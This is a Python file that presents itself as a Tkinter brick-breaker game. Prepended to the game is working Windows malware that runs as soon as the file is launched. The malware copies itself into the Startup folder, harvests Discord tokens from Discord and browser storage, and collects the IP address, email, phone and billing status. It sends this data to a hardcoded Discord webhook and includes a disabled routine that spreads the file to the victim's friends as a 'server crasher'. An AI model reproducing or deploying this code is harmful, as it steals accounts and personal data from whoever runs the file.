import os
if os.name != "nt":
    exit()
from re import findall
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from datetime import datetime
from threading import Thread
from time import sleep
from sys import argv
import shutil

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")

try:
    shutil.copyfile(__file__, ROAMING + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\system.py")
except:
    pass

PATHS = {
    "Discord"           : ROAMING + "\\Discord",
    "Discord Canary"    : ROAMING + "\\discordcanary",
    "Discord PTB"       : ROAMING + "\\discordptb",
    "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
    "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
    "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
}
def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers
def getuserdata(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
    except:
        pass
def gettokens(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens
def getdeveloper():
    dev = "wodx"
    try:
        dev = urlopen(Request("https://pastebin.com/raw/ssFxiejv")).read().decode()
    except:
        pass
    return dev
def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip
def getavatar(uid, aid):
    url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
    try:
        urlopen(Request(url))
    except:
        url = url[:-4]
    return url
def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
def getfriends(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships", headers=getheaders(token))).read().decode())
    except:
        pass
def getchat(token, uid):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token), data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
    except:
        pass
def has_payment_methods(token):
    try:
        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
    except:
        pass
def send_message(token, chat_id, form_data):
    try:
        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getheaders(token, "multipart/form-data; boundary=---------------------------325414537030329320151394843687"), data=form_data.encode())).read().decode()
    except:
        pass
def spread(token, form_data, delay):
    return # Remove to re-enabled
    for friend in getfriends(token):
        try:
            chat_id = getchat(token, friend["id"])
            send_message(token, chat_id, form_data)
        except Exception as e:
            pass
        sleep(delay)
def main():
    cache_path = ROAMING + "\\.cache~$"
    prevent_spam = True
    self_spread = True
    embeds = []
    working = []
    checked = []
    already_cached_tokens = []
    working_ids = []
    ip = getip()
    pc_username = os.getenv("UserName")
    pc_name = os.getenv("COMPUTERNAME")
    user_path_name = os.getenv("userprofile").split("\\")[2]
    developer = getdeveloper()
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in gettokens(path):
            if token in checked:
                continue
            checked.append(token)
            uid = None
            if not token.startswith("mfa."):
                try:
                    uid = b64decode(token.split(".")[0].encode()).decode()
                except:
                    pass
                if not uid or uid in working_ids:
                    continue
            user_data = getuserdata(token)
            if not user_data:
                continue
            working_ids.append(uid)
            working.append(token)
            username = user_data["username"] + "#" + str(user_data["discriminator"])
            user_id = user_data["id"]
            avatar_id = user_data["avatar"]
            avatar_url = getavatar(user_id, avatar_id)
            email = user_data.get("email")
            phone = user_data.get("phone")
            nitro = bool(user_data.get("premium_type"))
            billing = bool(has_payment_methods(token))
            embed = {
                "color": 0x0eec59,
                "fields": [
                    {
                        "name": "**Account Info**",
                        "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
                        "inline": True
                    },
                    {
                        "name": "**PC Info**",
                        "value": f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}',
                        "inline": True
                    },
                    {
                        "name": "**Token**",
                        "value": token,
                        "inline": False
                    }
                ],
                "author": {
                    "name": f"{username} ({user_id})",
                    "icon_url": avatar_url
                },
                "footer": {
                    "text": f"Nitro Method"
                }
            }
            embeds.append(embed)
    with open(cache_path, "a") as file:
        for token in checked:
            if not token in already_cached_tokens:
                file.write(token + "\n")
    if len(working) == 0:
        working.append('123')
    webhook = {
        "content": "@everyone",
        "embeds": embeds,
        "username": "bo3",
        "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
    }
    try:
        urlopen(Request("https://discord.com/api/webhooks/885283006544232448/9gzFbVwzOJtrQDYmOHtBDwWWsQmOzhGwhnliDr3cgIxoA8sHEmX1BzmMo1BXmk8DbaNl", data=dumps(webhook).encode(), headers=getheaders()))
    except:
        pass
    if self_spread:
        for token in working:
            with open(argv[0], encoding="utf-8") as file:
                content = file.read()
            payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{__file__}"\nContent-Type: text/plain\n\n{content}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\nserver crasher. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'
            Thread(target=spread, args=(token, payload, 7500 / 1000)).start()
try:
    main()
except Exception as e:
    print(e)
    pass
from tkinter import *
import time
import random

root = Tk()
root.title("Bounce Ball Game")
root.geometry("500x570")
root.resizable(0, 0)
root.wm_attributes("-topmost", 1)
canvas = Canvas(root, width=500, height=500, bd=0, highlightthickness=0, highlightbackground="Red", bg="Black")
canvas.pack(padx=10, pady=10)
score = Label(height=50, width=80, text="Score: 00", font="Calibri 14 italic")
score.pack(side="left")
root.update()


class Ball:
    def __init__(self, cvs, clr, pole, stones, scre):
        self.stones = stones
        self.cvs = cvs
        self.pole = pole
        self.scre = scre
        self.bottom_hit = False
        self.hit = 0
        self.id = canvas.create_oval(10, 10, 25, 25, fill=clr, width=1)
        self.cvs.move(self.id, 230, 461)
        start = [4, 3.8, 3.6, 3.4, 3.2, 3, 2.8, 2.6]
        random.shuffle(start)

        self.a = start[0]
        self.b = -start[0]
        self.cvs.move(self.id, self.a, self.b)
        self.cvs_height = canvas.winfo_height()
        self.cvs_width = canvas.winfo_width()

    def stone_strike(self, push):
        for stone_line in self.stones:
            for stone in stone_line:
                stone_push = self.cvs.coords(stone.id)

                try:
                    if push[2] >= stone_push[0] and push[0] <= stone_push[2]:
                        if push[3] >= stone_push[1] and push[1] <= stone_push[3]:
                            canvas.bell()
                            self.hit += 1
                            self.scre.configure(text="Score: " + str(self.hit))
                            self.cvs.delete(stone.id)
                            return True
                except:
                    continue
        return False

    def pole_strike(self, push):
        pole_push = self.cvs.coords(self.pole.id)
        if push[2] >= pole_push[0] and push[0] <= pole_push[2]:
            if push[3] >= pole_push[1] and push[1] <= pole_push[3]:

                return True
            return False

    def draw(self):
        self.cvs.move(self.id, self.a, self.b)
        push = self.cvs.coords(self.id)
        # print(pos)
        start = [4, 3.8, 3.6, 3.4, 3.2, 3, 2.8, 2.6]
        random.shuffle(start)
        if self.stone_strike(push):
            self.b = start[0]
        if push[1] <= 0:
            self.b = start[0]
        if push[3] >= self.cvs_height:
            self.bottom_hit = True
        if push[0] <= 0:
            self.a = start[0]
        if push[2] >= self.cvs_width:
            self.a = -start[0]
        if self.pole_strike(push):
            self.b = -start[0]


class Pole:
    def __init__(self, cvs, clr):
        self.cvs = cvs
        self.id = canvas.create_rectangle(0, 0, 100, 10, fill=clr)
        self.cvs.move(self.id, 200, 485)
        self.a = 0
        self.pauseSeconds = 0
        self.cvs_width = canvas.winfo_width()
        self.cvs.bind_all("<Left>", self.turn_left)
        self.cvs.bind_all("<Right>", self.turn_right)
        self.cvs.bind_all("<space>", self.pauseSeconds)

    def draw(self):
        push = self.cvs.coords(self.id)
        # print(pos)
        if push[0] + self.a <= 0:
            self.a = 0
        if push[2] + self.a >= self.cvs_width:
            self.a = 0
        self.cvs.move(self.id, self.a, 0)

    def turn_left(self, event):
        self.a = -3.5

    def turn_right(self, event):
        self.a = 3.5

    def pause(self, event):
        self.pauseSeconds += 1
        if self.pauseSeconds == 2:
            self.pauseSeconds = 0


class Stone:
    def __init__(self, cvs, clr):
        self.cvs = cvs
        self.id = canvas.create_oval(5, 5, 25, 25, fill=clr, width=2)


playing = False


def start_game(event):
    global playing
    if playing is False:
        playing = True
        score.configure(text="Score: 00")
        canvas.delete("all")
        BALL_COLOR = ["blue", "green", "violet"]
        STONE_COLOR = ["green", "dark blue", "red", "pink", "violet", "yellow",
                       "orange", "gray", "brown", "white", "blue", "yellow green",
                       "navajo white", "dark gray", "violet red", "powder blue", "blue violet"]
        random.shuffle(BALL_COLOR)
        pole = Pole(canvas, "yellow")
        stones = []
        for i in range(0, 5):
            b = []
            for j in range(0, 19):
                random.shuffle(STONE_COLOR)
                tmp = Stone(canvas, STONE_COLOR[0])
                b.append(tmp)
            stones.append(b)

        for i in range(0, 5):
            for j in range(0, 19):
                canvas.move(stones[i][j].id, 25 * j, 25 * i)

        ball = Ball(canvas, BALL_COLOR[0], pole, stones, score)
        root.update_idletasks()
        root.update()

        time.sleep(1)
        while 1:
            if pole.pauseSeconds != 1:
                try:
                    canvas.delete(m)
                    del m
                except:
                    pass
                if not ball.bottom_hit:
                    ball.draw()
                    pole.draw()
                    root.update_idletasks()
                    root.update()
                    time.sleep(0.01)
                    if ball.hit == 95:
                        canvas.create_text(250, 250, text="YOU WON !!", fill="yellow", font="Calibri 24 ")
                        root.update_idletasks()
                        root.update()
                        playing = False
                        break
                else:
                    canvas.create_text(250, 250, text="GAME OVER!!", fill="red", font="Calibri 24 ")
                    root.update_idletasks()
                    root.update()
                    playing = False
                    break
            else:
                try:
                    if m == None: pass
                except:
                    m = canvas.create_text(250, 250, text="PAUSE!!", fill="green", font="Calibri 24 ")
                root.update_idletasks()
                root.update()


root.bind_all("<Return>", start_game)
canvas.create_text(250, 250, text="Press Enter to start Game!!", fill="yellow", font="Calibri 18")
j = canvas.find_all()
root.mainloop()

